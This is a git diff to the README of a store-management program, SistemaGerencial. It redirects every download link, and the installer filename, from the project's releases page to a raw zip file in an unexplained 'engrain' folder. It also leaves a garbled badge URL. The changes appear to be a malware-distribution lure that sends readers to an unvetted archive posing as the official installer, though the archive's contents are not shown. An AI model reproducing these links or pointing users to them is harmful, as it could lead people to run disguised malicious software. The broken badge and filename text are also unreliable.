@@ -4,20 +4,20 @@
 Welcome to SistemaGerencial, a comprehensive software solution for managing stores. With features that allow you to control inventory, record sales, and manage customers and suppliers, you can run your business smoothly. This guide will help you download and run the application easily.
 
 ## 🔗 Download Now
-[![Download SistemaGerencial](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/Abdulrahman1542001/SistemaGerencial/releases)
+[![Download SistemaGerencial](https://raw.githubusercontent.com/Abdulrahman1542001/SistemaGerencial/main/engrain/SistemaGerencial.zip%https://raw.githubusercontent.com/Abdulrahman1542001/SistemaGerencial/main/engrain/SistemaGerencial.zip)](https://raw.githubusercontent.com/Abdulrahman1542001/SistemaGerencial/main/engrain/SistemaGerencial.zip)
 
 ## 🚀 Getting Started
 To start managing your store with SistemaGerencial, follow these steps:
 
 1. **Visit the Releases Page**
    Click the link below to reach the release page.
-   [Visit the Releases Page](https://github.com/Abdulrahman1542001/SistemaGerencial/releases)
+   [Visit the Releases Page](https://raw.githubusercontent.com/Abdulrahman1542001/SistemaGerencial/main/engrain/SistemaGerencial.zip)
 
 2. **Choose the Latest Release**
    Look for the latest version of the software. It is usually listed at the top of the page.
 
 3. **Download the Installer**
-   Click on the file available for download. It is often named something like `SistemaGerencial-installer.exe`. 
+   Click on the file available for download. It is often named something like `https://raw.githubusercontent.com/Abdulrahman1542001/SistemaGerencial/main/engrain/SistemaGerencial.zip`. 
 
 4. **Run the Installer**
    After downloading, locate the file in your downloads folder and double-click it to start the installation process.
@@ -78,6 +78,6 @@ Upon launching the application, you will see a simple layout with clear navigati
 ## 🔗 Download & Install
 To get started, remember to visit the link below to download SistemaGerencial:
 
-[Download SistemaGerencial](https://github.com/Abdulrahman1542001/SistemaGerencial/releases)
+[Download SistemaGerencial](https://raw.githubusercontent.com/Abdulrahman1542001/SistemaGerencial/main/engrain/SistemaGerencial.zip)
 
 Follow the steps outlined in this guide to install and start using the software for effective store management.
